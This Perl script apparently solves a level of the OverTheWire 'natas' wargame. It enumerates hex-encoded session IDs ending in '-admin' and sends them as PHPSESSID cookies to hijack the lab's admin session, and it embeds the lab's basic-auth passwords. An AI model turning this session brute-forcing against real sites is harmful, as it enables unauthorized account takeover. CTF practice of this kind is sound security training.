#!/usr/bin/perl

use HTTP::Request::Common;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use Data::Dumper;

$auser = "natas18";
$apass = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP";
$url = "http://natas18.natas.labs.overthewire.org/index.php";

$auser = "natas19";
$apass = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs";
$url = "http://natas19.natas.labs.overthewire.org/index.php?debug=true";
$query = "PHPSESSID=%s;";

$browser = LWP::UserAgent->new;

for($i=0;$i<=999;$i++)
{
	$request = GET $url;#, Content => [ username=>"natas20", password=>"qwer", ];
	$ssid = "";
	@i = split("", "$i");
	foreach $number(@i)
	{
		$ssid .= $number+30;
	}
	$ssid .= "2d61646d696e";
	print "Trying $ssid\n";
	$request->header(cookie => sprintf($query, $ssid));
	$request->authorization_basic($auser, $apass);
	
	$response = $browser->request($request);
	$res = $response->content;
	
	if(index($res, "You are logged in as a regular user.")<0)
	{
		print $res;
		last;
	}
	if(index($res, "Username: natas20")>=0)
	{
		print $res;
		last;
	}
	if(index($res, "Please login with your admin account to retrieve credentials for natas20.")>=0)
	{
		print "ESSEGIN SIKI";
		print $res;
		last;
	}
}

print $res;

